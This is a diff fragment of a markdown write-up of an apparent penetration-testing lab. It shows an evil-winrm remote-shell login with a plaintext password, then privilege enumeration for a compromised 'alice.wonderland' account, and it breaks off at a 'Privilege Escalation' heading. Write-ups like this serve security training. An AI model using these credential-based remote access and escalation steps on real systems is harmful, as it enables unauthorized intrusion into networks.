@@ -150,3 +150,23 @@ evil-winrm -i 192.168.50.129 -u clark.kent -p '3edcxsw2#EDCXSW@'
   orb\alice.wonderland
   *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> 
 ```
+
+> After acquiring two valid credentials, we proceeded to enumerate the orivileges the users have for potential privilege escalation.
+
+## alice.wonderland
+```bash
+  *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> whoami /priv
+
+  PRIVILEGES INFORMATION
+  ----------------------
+  
+  Privilege Name                Description                    State
+  ============================= ============================== =======
+  SeMachineAccountPrivilege     Add workstations to domain     Enabled
+  SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+  SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+  *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> 
+
+```
+
+## 4. Privilege Escalation 
